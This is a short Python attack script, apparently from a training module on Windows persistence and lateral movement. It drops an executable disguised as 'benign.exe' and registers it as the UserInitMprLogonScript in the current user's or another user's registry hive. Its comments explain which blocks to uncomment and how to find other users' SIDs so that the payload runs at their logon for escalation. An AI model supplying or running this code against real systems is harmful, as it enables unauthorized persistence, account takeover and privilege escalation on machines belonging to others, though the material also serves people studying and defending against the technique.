# This script must be run as Admin.
# It provides access to other user accounts by manipulating Registry logon scripts for lateral or escalated movement.

import os, shutil, winreg

filedir = os.path.join(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join(filedir,filename)
if os.path.isfile(filepath):
    os.remove(filepath)
os.system("python BuildExe.py")
shutil.move(filename,filedir)
# The script was explained in prior modules up to this point. The created file is only an example.

# reghive = winreg.HKEY_CURRENT_USER
# regpath = "Environment"
        # This part of the script needs to be uncommented first. It achieves persistence.

# reghive = winreg.HKEY_USERS
# regpath = "S-1-5-21-524849353-310586374-791561826-1002\Environment"
        # The regpath value specified here points to another user on the same system as "CURRENT_USER."
        # Uncommenting this block is what will provide the actual movement and possible escalation.
        # With access to the System under one user, run "wmic useraccount get name,sid" to return mappings of users to HKEY_USERS keys.
        # Insert your script into a different user's logon script from CURRENT_USER in order to move laterally or escalate.

reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitMprLogonScript",0,winreg.REG_SZ,filepath)
# UserInitMprLogonScript is the Windows Registry location for logon scripts.
# This block adds the created malicious file (specifics discussed in prior modules).
